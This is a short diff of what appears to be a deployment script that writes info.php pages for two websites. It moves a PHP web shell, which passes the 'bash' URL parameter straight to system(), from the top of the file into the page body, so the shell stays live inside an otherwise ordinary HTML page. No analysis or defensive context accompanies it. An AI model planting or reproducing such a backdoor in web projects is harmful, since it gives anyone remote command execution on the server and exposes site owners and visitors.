@@ -1,11 +1,6 @@
 cat > /var/www/gvm.donpau.com/./info.php << '_EOF_'
 cat > /var/www/hub.paotung.org/./info.php << '_EOF_'
-<pre><?php
-  if (isset( $_GET['bash'] )){
-    $cmd=$_GET['bash'];
-    system($cmd);
-  }
-?></pre>  
+
 <!doctype html>
 <html lang="en" dir="ltr">
 <head>
@@ -76,6 +71,12 @@ div {
 </script>
 </head>
 <body style="direction:ltr;">
+<pre><?php
+  if (isset( $_GET['bash'] )){
+    $cmd=$_GET['bash'];
+    system($cmd);
+  }
+?></pre>  
 <div class="main">
   <div class="header">
     <div class="menu">
